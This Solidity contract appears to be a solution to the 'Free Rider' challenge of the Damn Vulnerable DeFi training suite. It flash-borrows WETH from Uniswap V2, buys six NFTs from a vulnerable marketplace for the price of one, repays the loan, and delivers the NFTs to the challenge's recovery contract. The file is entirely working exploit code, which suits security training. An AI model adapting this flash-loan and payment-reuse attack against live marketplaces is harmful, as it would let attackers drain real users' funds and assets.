//SPDX-License-Identifier:UNLICENSED

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableBase/DamnValuableNFT.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";





pragma solidity ^0.8.0;


contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver{

    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecovery recovery;
    IUniswapV2Pair pair;
    IUniswapV2Factory factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);


    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address dvtTokenAddress;
    address owner;
    bytes data;
    uint256[] mintedToken = [0, 1, 2, 3, 4, 5];


    modifier onlyOwner(){
        require(msg.sender == owner, "Caller is not the Owner!");
        _;
    }



    constructor(
        address payable _marketplace,
        address _pair,
        address _dvtTokenAddress,
        address payable _recovery,
        address _nft
    ){
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        pair = IUniswapV2Pair(_pair);
        dvtTokenAddress = _dvtTokenAddress;
        recovery = FreeRiderRecovery(_recovery);
        nft = DamnValuableNFT(_nft);
        owner = msg.sender;
    }



    function callLoan(uint _amount)public onlyOwner{

        address pairAddress = factory.getPair(dvtTokenAddress, WETH);
        require(pairAddress != address(0), "Pair not exist!");

        uint amount0Out = WETH == pair.token0() ? _amount : 0;
        uint amount1Out = WETH == pair.token1() ? _amount : 0;

        data = abi.encode(_amount);

        pair.swap(amount0Out, amount1Out, address(this), data);
    }



    function transferToRecovery()public onlyOwner{
        bytes memory data = abi.encode(owner);

        for(uint i = 0; i < mintedToken.length; i++){
            nft.approve(address(recovery), mintedToken[i]);
            nft.safeTransferFrom(address(this), address(recovery), mintedToken[i], data);
        }
    }


    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4){
        return this.onERC721Received.selector;
    }




    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata)external{
        require(msg.sender == address(pair), "Caller is not the pair");
        require(sender == address(this), "Caller is not this address");

        uint amount = abi.decode(data, (uint));

        IWETH(WETH).withdraw(amount);

        marketplace.buyMany{value: amount}(mintedToken);

        uint fees = ((amount * 3) / 997) + 1;
        uint amountToRepay = fees + amount;

        IWETH(WETH).deposit{value:amountToRepay}();
        IWETH(WETH).transfer(address(pair), amountToRepay);
    }


    receive()external payable{}

}
